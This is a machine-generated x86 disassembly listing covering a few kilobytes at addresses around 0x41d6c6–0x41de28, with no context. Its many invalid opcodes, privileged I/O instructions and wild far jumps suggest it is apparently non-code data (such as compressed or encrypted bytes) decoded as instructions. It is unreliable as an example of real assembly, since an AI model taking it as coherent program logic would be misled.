  41d6c6:	and    esi,DWORD PTR [eax+ecx*1-0x7503878d]
  41d6cd:	std    
  41d6ce:	retf   0xd15f
  41d6d1:	(bad)  
  41d6d2:	adc    dl,BYTE PTR [esi+0x369b682f]
  41d6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d9:	retf   0x54ee
  41d6dc:	std    
  41d6dd:	stos   BYTE PTR es:[edi],al
  41d6de:	out    0x40,al
  41d6e0:	loopne 0x41d697
  41d6e2:	push   ds
  41d6e3:	aas    
  41d6e4:	test   BYTE PTR [ebx-0x12],al
  41d6e7:	popf   
  41d6e8:	ffree  st(5)
  41d6ea:	mov    esi,fs
  41d6ec:	lods   eax,DWORD PTR ds:[esi]
  41d6ed:	mov    bl,0xcd
  41d6ef:	lds    edx,FWORD PTR [eax]
  41d6f1:	add    edx,DWORD PTR [edi]
  41d6f3:	arpl   WORD PTR [edi+0x54],sp
  41d6f6:	jo     0x41d680
  41d6f8:	mov    BYTE PTR [esp+ebx*1+0x34b773fc],0x7
  41d700:	xlat   BYTE PTR ds:[ebx]
  41d701:	dec    ebx
  41d702:	push   0x53f9c2a7
  41d707:	stos   BYTE PTR es:[edi],al
  41d708:	and    BYTE PTR [edi],ch
  41d70a:	mov    BYTE PTR [ecx],0xcc
  41d70d:	retf   
  41d70e:	cs dec ebx
  41d710:	jne    0x41d765
  41d712:	hlt    
  41d713:	loope  0x41d739
  41d715:	jb     0x41d732
  41d717:	sub    eax,0x5415f382
  41d71c:	test   dl,dh
  41d71e:	pop    edi
  41d71f:	sub    al,0x5
  41d721:	sub    bl,BYTE PTR [ecx+0x4af537bd]
  41d727:	jmp    ebp
  41d729:	push   eax
  41d72a:	xor    dh,bl
  41d72c:	sbb    esp,DWORD PTR [ebp+0x77]
  41d72f:	fcmovnb st,st(3)
  41d731:	mov    ch,0x3d
  41d733:	in     eax,0x5f
  41d735:	pop    esi
  41d736:	lods   al,BYTE PTR ds:[esi]
  41d737:	sbb    eax,0x22fac6ea
  41d73c:	cmp    BYTE PTR [esi+0x6a29d69f],0x25
  41d743:	inc    esp
  41d744:	and    eax,0x43d69a08
  41d749:	in     eax,dx
  41d74a:	jl     0x41d765
  41d74c:	sub    BYTE PTR [eax-0x49a4744f],bl
  41d752:	adc    DWORD PTR [ebp+0x7f6f5485],edi
  41d758:	or     DWORD PTR [esi+0x4079a1fc],ecx
  41d75e:	add    ebx,DWORD PTR [ecx]
  41d760:	and    eax,0x9419f7be
  41d765:	(bad)  
  41d766:	int3   
  41d767:	mov    dh,ah
  41d769:	outs   dx,DWORD PTR ds:[esi]
  41d76a:	cs daa 
  41d76c:	xchg   esi,eax
  41d76d:	in     eax,dx
  41d76e:	outs   dx,BYTE PTR ds:[esi]
  41d76f:	pop    ss
  41d770:	pop    ecx
  41d771:	push   edi
  41d772:	mov    WORD PTR [eax],fs
  41d774:	mov    esi,ebx
  41d776:	aaa    
  41d777:	sar    DWORD PTR [ecx-0x66],0x9f
  41d77b:	pop    esp
  41d77c:	inc    esp
  41d77d:	push   ebx
  41d77e:	(bad)  
  41d77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d780:	adc    eax,0xc69c1d83
  41d785:	cs dec ecx
  41d787:	test   DWORD PTR [ebx],edx
  41d789:	mov    ebp,0x624f6fa0
  41d78e:	cs pop eax
  41d790:	adc    DWORD PTR [edi],ebx
  41d792:	mov    ebx,0xca226912
  41d797:	mul    DWORD PTR [esi+esi*8-0xf]
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	push   esi
  41d79d:	fld    QWORD PTR ds:0xba5db262
  41d7a3:	xor    al,0x1c
  41d7a5:	cli    
  41d7a6:	outs   dx,DWORD PTR ds:[esi]
  41d7a7:	ins    BYTE PTR es:[edi],dx
  41d7a8:	dec    edx
  41d7a9:	sub    DWORD PTR [edx*8+0x490cfa1],ebp
  41d7b0:	dec    ebp
  41d7b1:	cmc    
  41d7b2:	(bad)  [edi]
  41d7b4:	jno    0x41d7c8
  41d7b6:	mov    ebp,0xec64341c
  41d7bb:	outs   dx,DWORD PTR ds:[esi]
  41d7bc:	jne    0x41d781
  41d7be:	imul   esp,DWORD PTR [edx+0x74],0x73
  41d7c2:	retf   0x87e0
  41d7c5:	xor    al,0x79
  41d7c7:	mov    BYTE PTR ss:[esi-0x30],bl
  41d7cb:	out    0x3d,al
  41d7cd:	xor    DWORD PTR [edi-0x5c7b46e0],esi
  41d7d3:	xchg   esp,eax
  41d7d4:	(bad)  
  41d7d6:	cmp    dl,BYTE PTR [ecx]
  41d7d8:	sbb    bl,BYTE PTR [edx+ecx*1+0x7ccc4b32]
  41d7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7e0:	ja     0x41d84f
  41d7e2:	mov    edi,0xffc59939
  41d7e7:	sub    dl,BYTE PTR [edi+0x6ae14d34]
  41d7ed:	jp     0x41d810
  41d7ef:	mov    ah,BYTE PTR [ecx+0x14]
  41d7f2:	test   DWORD PTR [eax-0x6387165d],ecx
  41d7f8:	mov    eax,ds:0x76df30c4
  41d7fd:	fisttp QWORD PTR [eax+0x0]
  41d800:	and    bl,BYTE PTR ds:0x80cf1124
  41d806:	push   esi
  41d807:	mov    ah,BYTE PTR [esi]
  41d809:	pop    edi
  41d80a:	sbb    al,0x2d
  41d80c:	je     0x41d80f
  41d80e:	cli    
  41d80f:	xchg   ebx,eax
  41d810:	mov    dl,BYTE PTR [esi+0xbd34243]
  41d816:	push   edi
  41d817:	xchg   ecx,eax
  41d818:	ja     0x41d7b9
  41d81a:	sub    eax,0xa09d4d7
  41d81f:	dec    edx
  41d820:	rcl    BYTE PTR [eax-0x40df6e43],1
  41d826:	div    bh
  41d828:	cmp    DWORD PTR [ebp-0x2ba198d7],esi
  41d82e:	inc    ebp
  41d82f:	cmovge edi,DWORD PTR [ecx+0x18]
  41d833:	imul   esi,DWORD PTR [esi],0xffffffe1
  41d836:	cwde   
  41d837:	fimul  WORD PTR [ebx+0x30d48802]
  41d83d:	imul   esp,ebp,0x8adb5aaa
  41d843:	xor    dl,BYTE PTR [ebx]
  41d845:	cdq    
  41d846:	jge    0x41d7fa
  41d848:	cmp    DWORD PTR [ebx-0xc],eax
  41d84b:	or     al,0xbd
  41d84d:	xchg   ebx,eax
  41d84e:	adc    al,0x1e
  41d850:	pop    esi
  41d851:	xchg   esp,eax
  41d852:	xchg   edx,eax
  41d853:	rdtsc  
  41d855:	test   eax,0x834c66c7
  41d85a:	mov    esi,0x2179f42
  41d85f:	and    BYTE PTR [edx],al
  41d861:	cmp    edx,DWORD PTR [ebp+0x7d78ca4d]
  41d867:	leave  
  41d868:	mov    ds:0x669e676,eax
  41d86d:	cwde   
  41d86e:	push   es
  41d86f:	loope  0x41d84b
  41d871:	dec    ebx
  41d872:	inc    ebp
  41d873:	rcr    BYTE PTR [ebp-0x7f],0x14
  41d877:	fistp  DWORD PTR [ecx-0x4967d632]
  41d87d:	sbb    eax,0x1b6471e7
  41d882:	xchg   BYTE PTR [edi-0x18c6a407],cl
  41d888:	jecxz  0x41d8a5
  41d88a:	rol    DWORD PTR [esi+0x5c3301da],cl
  41d890:	dec    edx
  41d891:	aam    0x44
  41d893:	pop    ss
  41d894:	stc    
  41d895:	(bad)  [edx+ebx*2+0x47]
  41d899:	in     eax,0x26
  41d89b:	or     eax,0x8aee6ea7
  41d8a0:	repz neg BYTE PTR [edx+0x47c81e8]
  41d8a7:	into   
  41d8a8:	neg    DWORD PTR [edx+0x5edd1d7f]
  41d8ae:	pushf  
  41d8af:	add    al,BYTE PTR [edi-0x65244530]
  41d8b5:	in     eax,dx
  41d8b6:	push   ss
  41d8b7:	mov    eax,DWORD PTR ds:0x58471e6b
  41d8bd:	dec    esi
  41d8be:	jne    0x41d85a
  41d8c0:	adc    BYTE PTR [edi+0x8e7928],bh
  41d8c6:	add    esp,DWORD PTR [edx]
  41d8c8:	popf   
  41d8c9:	mov    ds:0xe6783da0,eax
  41d8ce:	mov    ebp,0x61fce04
  41d8d3:	cmp    DWORD PTR [esi-0x42],ebp
  41d8d6:	and    DWORD PTR [ebx+0x68],ecx
  41d8d9:	jecxz  0x41d8df
  41d8db:	mov    dh,0x32
  41d8dd:	fistp  QWORD PTR [ebx+edi*4]
  41d8e0:	ss (bad) 
  41d8e2:	sbb    eax,DWORD PTR [eax-0x147781a3]
  41d8e8:	mov    eax,0xd93d09ee
  41d8ed:	fcmovu st,st(2)
  41d8ef:	fmul   QWORD PTR [eax+0x5a]
  41d8f2:	inc    edx
  41d8f3:	jp     0x41d8c2
  41d8f5:	fmul   DWORD PTR [edx+0x21c353dd]
  41d8fb:	movlps QWORD PTR [edi+0x4deb3e00],xmm3
  41d902:	cdq    
  41d903:	fsubr  QWORD PTR [ebx]
  41d905:	in     eax,dx
  41d906:	(bad)  
  41d907:	call   esi
  41d909:	mov    al,0x20
  41d90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d90c:	outs   dx,DWORD PTR ds:[esi]
  41d90d:	sbb    DWORD PTR [edi],0x10
  41d910:	inc    ebx
  41d911:	lahf   
  41d912:	sar    BYTE PTR [ebx-0x17b0e26a],1
  41d918:	mov    DWORD PTR ds:0xb9cb90,eax
  41d91e:	cmp    BYTE PTR [eax+0x2f9ef41b],bh
  41d924:	in     al,0x8d
  41d926:	mov    ecx,0xfa744156
  41d92b:	inc    esp
  41d92c:	rol    BYTE PTR [ebx+0x6ac7e32a],1
  41d932:	jns    0x41d919
  41d934:	xchg   DWORD PTR [esi-0x67285b37],esi
  41d93a:	inc    esi
  41d93b:	adc    DWORD PTR [esi+0x1f],ecx
  41d93e:	sahf   
  41d93f:	movaps xmm3,XMMWORD PTR [eax+0x21]
  41d943:	adc    eax,DWORD PTR [ebx+0x55]
  41d946:	sbb    BYTE PTR [edx+0x590e3870],dl
  41d94c:	loop   0x41d8de
  41d94e:	aad    0xe5
  41d950:	sub    edx,eax
  41d952:	ins    BYTE PTR es:[edi],dx
  41d953:	loop   0x41d912
  41d955:	dec    esi
  41d956:	and    DWORD PTR [edi+0x45],esi
  41d959:	mov    eax,ds:0x16f08c81
  41d95e:	jmp    0xff32:0xbfc0a4d0
  41d965:	iret   
  41d966:	(bad)  [edi+eax*4+0xd1b69f0]
  41d96d:	clc    
  41d96e:	push   edx
  41d96f:	add    ecx,DWORD PTR [bx+di]
  41d972:	jmp    DWORD PTR [esi-0x61]
  41d975:	mov    ebp,0xdfad2dcb
  41d97a:	jg     0x41d93a
  41d97c:	popa   
  41d97d:	xor    eax,0xd70fda03
  41d982:	out    dx,eax
  41d983:	push   es
  41d984:	hlt    
  41d985:	imul   eax,DWORD PTR [esi],0x317e78bc
  41d98b:	pop    es
  41d98c:	shl    eax,0x65
  41d98f:	out    0x42,eax
  41d991:	sbb    eax,0x36d7dcef
  41d996:	and    al,0x84
  41d998:	outs   dx,DWORD PTR ds:[esi]
  41d999:	pop    esi
  41d99a:	push   eax
  41d99b:	add    al,0x99
  41d99d:	fwait
  41d99e:	ja     0x41d9af
  41d9a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a1:	nop
  41d9a2:	je     0x41d9f1
  41d9a4:	(bad)  
  41d9a5:	ins    BYTE PTR es:[edi],dx
  41d9a6:	shl    DWORD PTR [esi+0x3a43e99f],0x3c
  41d9ad:	dec    eax
  41d9ae:	loopne 0x41d967
  41d9b0:	lahf   
  41d9b1:	imul   edi,DWORD PTR [esi],0xffffffcc
  41d9b4:	stos   DWORD PTR es:[edi],eax
  41d9b5:	add    DWORD PTR [edi],esp
  41d9b7:	adc    DWORD PTR [eax+0x3ebdd0c5],edi
  41d9bd:	jl     0x41da39
  41d9bf:	es mov ah,cl
  41d9c2:	(bad)  
  41d9c3:	mov    ebx,0xc41ee85e
  41d9c8:	dec    esp
  41d9c9:	rcl    DWORD PTR [ebx],0xa5
  41d9cc:	jo     0x41d9f2
  41d9ce:	fcomp  QWORD PTR [ecx+0x56]
  41d9d1:	int    0xc3
  41d9d3:	cmp    dh,BYTE PTR [ecx]
  41d9d5:	sbb    BYTE PTR [ecx+0x4c],cl
  41d9d8:	mov    dh,0xa0
  41d9da:	cmp    eax,0xec1a3f2
  41d9df:	jbe    0x41d9bb
  41d9e1:	(bad)  
  41d9e2:	xchg   esp,eax
  41d9e3:	mov    ch,0x18
  41d9e5:	sub    al,0x91
  41d9e7:	fistp  DWORD PTR [eax+0x4e6d81d2]
  41d9ed:	test   ebp,edi
  41d9ef:	cwde   
  41d9f0:	cwde   
  41d9f1:	dec    eax
  41d9f2:	icebp  
  41d9f3:	pop    ds
  41d9f4:	jle    0x41d9b6
  41d9f6:	rol    BYTE PTR [edx],1
  41d9f8:	js     0x41da25
  41d9fa:	jno    0x41d99f
  41d9fc:	adc    dl,cl
  41d9fe:	mov    ebp,0xd7a1cf59
  41da03:	xchg   esp,eax
  41da04:	dec    ebp
  41da05:	daa    
  41da06:	pop    ebp
  41da07:	add    DWORD PTR [edi-0x3d],ecx
  41da0a:	dec    ebx
  41da0b:	leave  
  41da0c:	mov    esp,ebp
  41da0e:	test   DWORD PTR [eax-0x30],eax
  41da11:	push   ebp
  41da12:	push   ds
  41da13:	pop    ebx
  41da14:	mov    es,WORD PTR [ecx+0x20635290]
  41da1a:	cdq    
  41da1b:	sub    eax,0x67a61ef9
  41da20:	cmp    al,0x14
  41da22:	cdq    
  41da23:	dec    eax
  41da24:	pop    esi
  41da25:	retf   0x6439
  41da28:	bound  ecx,QWORD PTR [edi-0x2cf2e390]
  41da2e:	retf   
  41da2f:	xchg   ebp,eax
  41da30:	sbb    eax,0x86e10e62
  41da35:	cmp    DWORD PTR [edi],ebp
  41da37:	test   al,0x17
  41da39:	pop    esp
  41da3a:	push   0x19
  41da3c:	cmp    esi,eax
  41da3e:	xchg   esp,eax
  41da3f:	mov    ecx,0x6560db82
  41da44:	mov    ebp,0xa8f55a08
  41da49:	push   edi
  41da4a:	pop    esp
  41da4b:	out    dx,eax
  41da4c:	sbb    bl,BYTE PTR [eiz*4-0x2d5e18f]
  41da53:	sub    al,0xfc
  41da55:	and    DWORD PTR [ebx+eax*8],edx
  41da58:	jecxz  0x41dac8
  41da5a:	mov    WORD PTR [esp+eax*4-0x3edb968c],?
  41da61:	aas    
  41da62:	xor    DWORD PTR [ebx+0x37],esp
  41da65:	jge    0x41da3a
  41da67:	sbb    eax,0xe172a9c
  41da6c:	push   ebx
  41da6d:	out    dx,eax
  41da6e:	adc    eax,DWORD PTR [eax]
  41da70:	pop    ds
  41da71:	sub    al,0x29
  41da73:	and    al,0x3e
  41da75:	stos   BYTE PTR es:[edi],al
  41da76:	cmc    
  41da77:	pop    ss
  41da78:	push   cs
  41da79:	in     al,0x50
  41da7b:	pop    ebx
  41da7c:	sti    
  41da7d:	push   cs
  41da7e:	adc    dl,cl
  41da80:	adc    ch,0xe5
  41da83:	mov    bh,BYTE PTR [esi-0x44]
  41da86:	jge    0x41dafc
  41da88:	iret   
  41da89:	dec    esp
  41da8a:	int3   
  41da8b:	repnz enter 0xbbdf,0xa
  41da90:	aaa    
  41da91:	rol    DWORD PTR [eax],1
  41da93:	cmp    BYTE PTR [eax],dh
  41da95:	push   ss
  41da96:	clc    
  41da97:	fnstcw WORD PTR [ecx]
  41da99:	mov    bl,0x67
  41da9b:	add    BYTE PTR ss:[eax-0x71],0x1e
  41daa0:	or     al,0x81
  41daa2:	add    bl,BYTE PTR [ecx+edx*4-0x7aa2098]
  41daa9:	pop    edx
  41daaa:	(bad)  
  41daac:	(bad)  [ebx]
  41daae:	jbe    0x41da40
  41dab0:	fild   WORD PTR [eax+0xe]
  41dab3:	(bad)  
  41dab4:	scas   al,BYTE PTR es:[edi]
  41dab5:	(bad)  
  41dab6:	jno    0x41dac4
  41dab8:	mov    edx,0x1b5ae4d1
  41dabd:	mov    eax,0x86ad5065
  41dac2:	mov    esp,0x6f96665e
  41dac7:	sbb    dh,BYTE PTR [edi-0x543a1ed2]
  41dacd:	pop    eax
  41dace:	retf   
  41dacf:	push   0xfffffffb
  41dad1:	jmp    0x7ea3bf68
  41dad6:	rcr    BYTE PTR [ecx+0x1],1
  41dad9:	daa    
  41dada:	jo     0x41da7e
  41dadc:	pop    edi
  41dadd:	in     eax,0xbe
  41dadf:	add    esi,esi
  41dae1:	mov    esp,0x1130763b
  41dae6:	imul   DWORD PTR [edx]
  41dae8:	shl    BYTE PTR [esi+edx*2],0xf3
  41daec:	retf   0xa243
  41daef:	or     edi,DWORD PTR [ebp+0x691dc366]
  41daf5:	mov    ah,0x7d
  41daf7:	aad    0x47
  41daf9:	retf   
  41dafa:	les    edi,FWORD PTR [esi+0x76c3a98]
  41db00:	call   0x78f02c7a
  41db05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db06:	dec    esi
  41db07:	enter  0xc5,0xf8
  41db0b:	inc    edx
  41db0c:	pop    ecx
  41db0d:	push   edi
  41db0e:	add    DWORD PTR ds:0xa34bd847,ebx
  41db14:	mov    BYTE PTR [esi+ecx*4+0x631627c4],ah
  41db1b:	mov    bl,0x55
  41db1d:	sbb    al,ah
  41db1f:	shr    DWORD PTR [eax+0x64],0x94
  41db23:	fwait
  41db24:	test   esp,edx
  41db26:	sbb    BYTE PTR [eax+0x3844d875],0x19
  41db2d:	(bad)
  41db30:	outs   dx,DWORD PTR ds:[esi]
  41db31:	or     cl,BYTE PTR [edi]
  41db33:	loope  0x41db1e
  41db35:	adc    eax,ebx
  41db37:	mov    al,ds:0x911f9354
  41db3c:	xchg   esi,eax
  41db3e:	clc    
  41db3f:	push   eax
  41db40:	cmp    eax,0x4d7d33f9
  41db45:	mov    al,ds:0xf4eea8fd
  41db4a:	pop    esp
  41db4b:	add    BYTE PTR [edx-0x32],ch
  41db4e:	out    dx,al
  41db4f:	dec    edx
  41db50:	push   es
  41db51:	(bad)  
  41db52:	jmp    0xf85730f0
  41db57:	inc    esp
  41db58:	xor    al,BYTE PTR [edi-0x5ee4667b]
  41db5e:	je     0x41db2d
  41db60:	cli    
  41db61:	enter  0x7b54,0x49
  41db65:	adc    DWORD PTR ds:0xf8aaef5a,0x2b
  41db6c:	scas   eax,DWORD PTR es:[edi]
  41db6d:	mov    BYTE PTR [esi+0x6bd3671],dl
  41db73:	scas   eax,DWORD PTR es:[edi]
  41db74:	test   DWORD PTR [esi-0x66685770],ecx
  41db7a:	ja     0x41db7a
  41db7c:	fadd   QWORD PTR [esp+ecx*2-0x5744d7fa]
  41db83:	jne    0x41db0d
  41db85:	scas   eax,DWORD PTR es:[edi]
  41db86:	pop    ss
  41db87:	jg     0x41dbf6
  41db89:	je     0x41db0b
  41db8b:	mov    ebx,0xaf8a7ce8
  41db90:	in     eax,0x7b
  41db92:	scas   al,BYTE PTR es:[edi]
  41db93:	push   ds
  41db94:	xchg   BYTE PTR [edi],al
  41db96:	or     al,0x1f
  41db98:	and    dh,BYTE PTR [edx-0x415d336c]
  41db9e:	pop    esi
  41db9f:	pop    esi
  41dba0:	ins    BYTE PTR es:[edi],dx
  41dba1:	cmp    eax,0xd1c0d46a
  41dba6:	ins    BYTE PTR es:[edi],dx
  41dba7:	add    dl,BYTE PTR [ebp-0x10346506]
  41dbad:	pushf  
  41dbae:	or     BYTE PTR [edx-0x11],dl
  41dbb1:	dec    edi
  41dbb2:	inc    edi
  41dbb3:	shl    ebp,0xba
  41dbb6:	jbe    0x41db3e
  41dbb8:	mov    dl,0x8e
  41dbba:	(bad)
  41dbbd:	stos   DWORD PTR es:[edi],eax
  41dbbe:	retf   
  41dbbf:	stc    
  41dbc0:	imul   edi,edi,0xfffffff9
  41dbc3:	mov    dl,BYTE PTR [ebx]
  41dbc5:	push   ebp
  41dbc6:	fild   QWORD PTR [esi-0x31]
  41dbc9:	sub    al,0x8d
  41dbcb:	call   0x2a3fdd3d
  41dbd0:	push   ecx
  41dbd1:	bound  ecx,QWORD PTR [bp+si]
  41dbd4:	fist   DWORD PTR [edi+edx*4+0x336acfdd]
  41dbdb:	adc    al,0xe8
  41dbdd:	std    
  41dbde:	and    BYTE PTR [ebx+edi*2-0x18a4238b],bl
  41dbe5:	call   FWORD PTR [ecx+0x1f]
  41dbe8:	fwait
  41dbe9:	cmp    ebp,DWORD PTR es:[esi-0x48]
  41dbed:	mov    eax,ds:0x14111246
  41dbf2:	cdq    
  41dbf3:	add    ebx,DWORD PTR [ecx+esi*8]
  41dbf6:	jns    0x41dbe7
  41dbf8:	in     eax,dx
  41dbf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbfa:	aad    0x16
  41dbfc:	call   0x80039649
  41dc01:	jno    0x41db9f
  41dc03:	ret    
  41dc04:	scas   eax,DWORD PTR es:[edi]
  41dc05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc06:	push   ds
  41dc07:	or     eax,0xf110d614
  41dc0c:	out    0x4c,al
  41dc0e:	jb     0x41dc75
  41dc10:	push   0xf90c5f40
  41dc15:	sub    DWORD PTR [ebx+eiz*8-0x1b5a7aa4],edx
  41dc1c:	dec    esi
  41dc1d:	scas   al,BYTE PTR es:[edi]
  41dc1e:	lock sbb eax,0xff8ed1f1
  41dc24:	lods   al,BYTE PTR ds:[esi]
  41dc25:	sahf   
  41dc26:	lods   al,BYTE PTR ds:[esi]
  41dc27:	(bad)  
  41dc28:	std    
  41dc29:	dec    edi
  41dc2a:	adc    al,0x88
  41dc2c:	cmp    eax,0xce3a491f
  41dc31:	rcl    bl,1
  41dc33:	shl    BYTE PTR [edi-0x1f80b30a],0x48
  41dc3a:	dec    edx
  41dc3b:	mov    cl,0x12
  41dc3d:	repz jo 0x41dc42
  41dc40:	loopne 0x41dc5f
  41dc42:	or     al,ah
  41dc44:	out    0x83,eax
  41dc46:	pop    ebx
  41dc47:	scas   eax,DWORD PTR es:[edi]
  41dc48:	repnz xor dl,BYTE PTR [ebp-0x278dd65b]
  41dc4f:	into   
  41dc50:	sbb    al,0x93
  41dc52:	jmp    0x41dbee
  41dc54:	push   esp
  41dc55:	repz mov edi,0x2a1ebd9b
  41dc5b:	stos   DWORD PTR es:[edi],eax
  41dc5c:	imul   ecx,DWORD PTR [eax+0x4088e7d1],0x68b31c2a
  41dc66:	mov    WORD PTR [esi+0x69],cs
  41dc69:	mov    ah,0xc6
  41dc6b:	add    ebp,0x34472dbd
  41dc71:	bound  edi,QWORD PTR [ecx-0x23bca350]
  41dc77:	or     eax,0xe3bc62cd
  41dc7c:	xor    ah,0x9c
  41dc7f:	jbe    0x41dcdd
  41dc81:	sub    eax,esp
  41dc83:	fistp  WORD PTR [ebx-0x27229de9]
  41dc89:	cmp    edx,DWORD PTR [eax-0x6feb4ef5]
  41dc8f:	ror    edx,1
  41dc91:	das    
  41dc92:	test   eax,0xcc37f522
  41dc97:	push   esp
  41dc98:	es mov al,0x5b
  41dc9b:	mov    ebp,0x70fc32c7
  41dca0:	push   esi
  41dca1:	fst    QWORD PTR [esi]
  41dca3:	scas   al,BYTE PTR es:[edi]
  41dca4:	out    0x5f,al
  41dca6:	pop    ds
  41dca7:	pop    es
  41dca8:	pop    edi
  41dca9:	(bad)  
  41dcaa:	clc    
  41dcab:	rcl    DWORD PTR [ebp+edi*8-0x69],cl
  41dcaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb0:	daa    
  41dcb1:	xor    ebp,DWORD PTR [esi]
  41dcb3:	loopne 0x41dca6
  41dcb5:	in     al,dx
  41dcb6:	xor    DWORD PTR [esp+eiz*4+0x1c],edx
  41dcba:	jmp    0x41dcd4
  41dcbc:	adc    al,0x76
  41dcbe:	loope  0x41dd3b
  41dcc0:	bswap  edx
  41dcc2:	(bad)  
  41dcc3:	imul   edx,DWORD PTR [eax],0xffffffa2
  41dcc6:	outs   dx,DWORD PTR ds:[esi]
  41dcc7:	pop    esi
  41dcc8:	xchg   esp,eax
  41dcc9:	test   BYTE PTR [ecx],bh
  41dccb:	pop    ecx
  41dccc:	dec    esp
  41dccd:	sub    al,0x99
  41dccf:	and    BYTE PTR [ecx+eax*4],cl
  41dcd2:	jmp    0x1d3d12e2
  41dcd7:	call   0xfd6c:0xdab3c56d
  41dcde:	jne    0x41dcb8
  41dce0:	lock dec esi
  41dce2:	loopne 0x41dc64
  41dce4:	rol    DWORD PTR [ebx+eiz*1+0x1becfb34],1
  41dceb:	cmp    edx,DWORD PTR ds:0xcea99593
  41dcf1:	dec    edi
  41dcf2:	push   ss
  41dcf3:	test   BYTE PTR [ebx+esi*2],dl
  41dcf6:	cdq    
  41dcf7:	out    dx,eax
  41dcf8:	frstor [ebx-0x1]
  41dcfb:	mov    ecx,0x31adacec
  41dd00:	jbe    0x41dd4c
  41dd02:	xor    BYTE PTR [ebx+0x5a808fb2],al
  41dd08:	into   
  41dd09:	dec    eax
  41dd0a:	xchg   DWORD PTR [ecx],ebp
  41dd0c:	in     eax,dx
  41dd0d:	pop    es
  41dd0e:	pusha  
  41dd0f:	add    esp,esi
  41dd11:	not    BYTE PTR [edi]
  41dd13:	inc    esp
  41dd14:	arpl   bx,ax
  41dd16:	pushf  
  41dd17:	mov    ds:0x54b4017d,al
  41dd1c:	outs   dx,DWORD PTR ds:[esi]
  41dd1d:	push   ss
  41dd1e:	and    dl,BYTE PTR [edi-0x10]
  41dd21:	adc    eax,0xba7dbfb5
  41dd26:	test   BYTE PTR [ebx+0x5da475c8],bl
  41dd2c:	sub    cl,BYTE PTR [ecx]
  41dd2e:	es mov dh,0xc3
  41dd31:	out    0x87,eax
  41dd33:	popw   es
  41dd35:	cmp    ebp,DWORD PTR [ebx+0x68]
  41dd38:	int3   
  41dd39:	dec    ecx
  41dd3a:	scas   eax,DWORD PTR es:[edi]
  41dd3b:	jo     0x41dd27
  41dd3d:	inc    ecx
  41dd3e:	xor    DWORD PTR [eax],edi
  41dd40:	push   ecx
  41dd41:	repz frstor [eax+0x281c1999]
  41dd48:	add    al,0x68
  41dd4a:	mov    esi,0xeee33c6d
  41dd4f:	xchg   ebp,eax
  41dd50:	das    
  41dd51:	mov    al,ds:0xee30eeda
  41dd56:	jb     0x41dd0f
  41dd58:	ret    
  41dd59:	mov    dl,0x33
  41dd5b:	push   edx
  41dd5c:	add    al,0xed
  41dd5e:	add    DWORD PTR [ecx-0x21b4392c],ebp
  41dd64:	dec    ebp
  41dd65:	dec    ebp
  41dd66:	or     BYTE PTR ds:0x8051d05a,bh
  41dd6c:	add    bh,BYTE PTR ds:0xb8115276
  41dd72:	call   0xea9e:0xbb9f376
  41dd79:	gs loope 0x41dd3a
  41dd7c:	lods   eax,DWORD PTR ds:[esi]
  41dd7d:	(bad)  
  41dd7e:	rcl    DWORD PTR [ecx-0x39],cl
  41dd81:	sub    eax,0x2c789e89
  41dd86:	pop    edi
  41dd87:	dec    ebx
  41dd88:	(bad)  
  41dd89:	lods   al,BYTE PTR ds:[esi]
  41dd8a:	adc    DWORD PTR [eax],ebx
  41dd8c:	mov    ah,0xf2
  41dd8e:	pushf  
  41dd8f:	clc    
  41dd90:	fldenv [ebp-0x2d]
  41dd93:	dec    edx
  41dd94:	stos   BYTE PTR es:[edi],al
  41dd95:	fs jp  0x41dd4f
  41dd98:	cmp    eax,0xf96742ee
  41dd9d:	jns    0x41de08
  41dd9f:	jg     0x41de08
  41dda1:	xchg   DWORD PTR [edx+0xb],eax
  41dda4:	mov    esi,0x1d95b0b9
  41dda9:	outs   dx,DWORD PTR ds:[esi]
  41ddaa:	cmp    edi,ecx
  41ddac:	add    BYTE PTR [ebx+0x6a1ae5f6],0x54
  41ddb3:	mov    edi,0x97601238
  41ddb8:	inc    eax
  41ddb9:	fld    QWORD PTR [esi]
  41ddbb:	push   cs
  41ddbc:	cdq    
  41ddbd:	pop    esi
  41ddbe:	xor    BYTE PTR [edi],0x51
  41ddc1:	sbb    BYTE PTR [edx+0x76],ah
  41ddc4:	and    DWORD PTR [eax+0x8],esp
  41ddc7:	imul   ecx,DWORD PTR [esp+esi*4+0x14cf9c80],0x38
  41ddcf:	in     eax,0x46
  41ddd1:	sti    
  41ddd2:	jno    0x41ddbc
  41ddd4:	cmp    edi,edx
  41ddd6:	inc    ebx
  41ddd7:	call   DWORD PTR [eax]
  41ddd9:	add    BYTE PTR [ebx],dh
  41dddb:	popf   
  41dddc:	js     0x41dd5f
  41ddde:	rcl    DWORD PTR [esi],0x6b
  41dde1:	dec    eax
  41dde2:	enter  0x6eb,0x3c
  41dde6:	xor    eax,0x950efb72
  41ddeb:	xchg   esp,eax
  41ddec:	mov    DWORD PTR [eax],ebp
  41ddee:	out    0xf1,al
  41ddf0:	xchg   DWORD PTR [esi],edi
  41ddf2:	add    ebx,DWORD PTR [ecx-0x70cdc56f]
  41ddf8:	ja     0x41ddb1
  41ddfa:	mov    esi,0x4ba8c567
  41ddff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de00:	arpl   WORD PTR [edi],dx
  41de02:	rcr    esi,cl
  41de04:	fstp   st(7)
  41de06:	outs   dx,DWORD PTR ds:[esi]
  41de07:	icebp  
  41de08:	test   eax,edi
  41de0a:	or     cl,BYTE PTR [ecx-0x51]
  41de0d:	les    edi,FWORD PTR [eax]
  41de0f:	sbb    DWORD PTR [edi],ebp
  41de11:	out    dx,eax
  41de12:	add    al,BYTE PTR [esi-0x69c267d1]
  41de18:	adc    DWORD PTR ds:0xd26fa7cd,esi
  41de1e:	inc    ebp
  41de1f:	sbb    al,0x58
  41de21:	fld    DWORD PTR [ebp+edx*1+0x6b]
  41de25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de26:	cmp    al,0xc5
  41de28:	sub    ebp,esp
